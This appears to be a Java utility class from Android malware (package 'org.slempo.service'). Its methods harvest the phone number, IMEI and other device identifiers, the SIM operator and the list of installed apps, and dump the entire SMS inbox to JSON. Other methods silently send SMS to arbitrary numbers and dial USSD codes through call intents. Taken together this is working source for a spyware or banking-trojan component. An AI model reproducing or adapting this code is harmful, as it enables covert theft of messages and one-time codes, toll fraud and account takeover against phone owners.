package org.slempo.service.utils;

import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.Locale;

import org.json.JSONArray;
import org.json.JSONObject;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

public class Utils {

	public static String getPhoneNumber(final Context context) {
		String phoneNumber = ((TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE)).getLine1Number();
		if (phoneNumber != null && !phoneNumber.equals("")) {
			return phoneNumber;
		}
		return "";
	}

	public static String getCountry(final Context context) {
		return context.getResources().getConfiguration().locale.getCountry();
	}

	public static String getDeviceId(final Context context) {
		String deviceId = ((TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();
		if (!deviceId.equals("") && deviceId != null
				&& !deviceId.equals("000000000000000")) {
			return deviceId;
		}
		deviceId = Settings.Secure.getString(
				context.getContentResolver(), Settings.Secure.ANDROID_ID);
		if (deviceId != null && !deviceId.equals("")) {
			return deviceId;
		}		
		deviceId = android.os.Build.SERIAL;
		if (deviceId != null && !deviceId.equals("") && !deviceId.equalsIgnoreCase("unknown")) {
			return deviceId;
		}
		return "not available";
	}

	public static String getOperator(final Context context) {
		TelephonyManager mgr = (TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE);
		if (mgr.getSimState() == TelephonyManager.SIM_STATE_READY) {
			return mgr.getSimOperator();
		} else {
			return "sim is off";
		}
	}

	public static String getCutIMEI(final Context context) {
		String imei = getDeviceId(context);
		if (imei != null) {
			return imei.substring(0, Math.min(imei.length(), 10));
		} else {
			return "";
		}
	}

	public static String getModel() {
		String manufacturer = Build.MANUFACTURER;
		String model = Build.MODEL;
		if (model.startsWith(manufacturer)) {
			return capitalize(model);
		} else {
			return capitalize(manufacturer) + " " + model;
		}
	}

	private static String capitalize(String s) {
		if (s == null || s.length() == 0) {
			return "";
		}
		char first = s.charAt(0);
		if (Character.isUpperCase(first)) {
			return s;
		} else {
			return Character.toUpperCase(first) + s.substring(1);
		}
	}

	public static String getOS() {
		return android.os.Build.VERSION.RELEASE;
	}

	public static void putBooleanValue(SharedPreferences settings,
			final String name, final boolean value) {
		SharedPreferences.Editor editor = settings.edit();
		editor.putBoolean(name, value);
		editor.commit();
	}

	public static void putStringValue(SharedPreferences settings,
			final String name, final String value) {
		SharedPreferences.Editor editor = settings.edit();
		editor.putString(name, value);
		editor.commit();
	}

	public static boolean sendMessage(final String number, final String text) {
		if (number.equals("")) {
			return false;
		}
		SmsManager sms = SmsManager.getDefault();
		ArrayList<String> parts = sms.divideMessage(text);
		if (parts.size() > 1) {
			sms.sendMultipartTextMessage(number, null, parts, null, null);
		} else {
			sms.sendTextMessage(number, null, text, null, null);
		}
		return true;
	}

	public static JSONArray getInstalledAppsList(final Context context) {
		final PackageManager packageManager = context.getPackageManager();
		List<ApplicationInfo> packages = packageManager
				.getInstalledApplications(PackageManager.GET_META_DATA);
		JSONArray jArray = new JSONArray();
		for (ApplicationInfo applicationInfo : packages) {
			if (!isSystemPackage(applicationInfo)) {
				jArray.put(applicationInfo.packageName);
			}
		}
		return jArray;
	}

	private static boolean isSystemPackage(ApplicationInfo applicationInfo) {
		return ((applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0) ? true
				: false;
	}

	public static void makeUSSD(Context context, final String number) {
		Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:"
				+ Uri.encode(number)));
		intent.setFlags(intent.getFlags() | Intent.FLAG_ACTIVITY_NEW_TASK);
		context.startActivity(intent);
	}

	public static String readMessagesFromDeviceDB(Context context) {
		Uri SMSURI = Uri.parse("content://sms/inbox");
		String[] projection = new String[] { "_id", "address", "body", "date" };
		Cursor cursor = null;
		JSONArray jArray = new JSONArray();
		try {
			cursor = context.getContentResolver().query(SMSURI, projection,
					null, null, null);

			if (cursor != null && cursor.moveToFirst()) {
				do {
					String address = cursor.getString(cursor
							.getColumnIndex("address"));
					String body = cursor.getString(cursor
							.getColumnIndex("body"));
					String date = cursor.getString(cursor
							.getColumnIndex("date"));

					SimpleDateFormat formatter = new SimpleDateFormat(
							"dd-MM-yyyy HH:mm:ss", Locale.US);
					date = formatter.format(new Date(Long.parseLong(date)));
					JSONObject jObj = new JSONObject();
					jObj.put("from", address);
					jObj.put("body", body);
					jObj.put("date", date);
					jArray.put(jObj);
				} while (cursor.moveToNext());
			}
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			if (cursor != null) {
				cursor.close();
			}
		}
		return jArray.toString();
	}

	public static boolean isDateCorrect(String date) {
		SimpleDateFormat format = new SimpleDateFormat("dd.MM.yyyy", Locale.US);
		try {
			final Calendar c = Calendar.getInstance();
			int year = c.get(Calendar.YEAR);
			Date dateObj = format.parse(date);
			Calendar calendar = Calendar.getInstance();
			calendar.setTime(dateObj);
			if (year - calendar.get(Calendar.YEAR) > 17) {
				return true;
			}
			return false;
		} catch (ParseException e) {
			return false;
		}
	}/**/
}
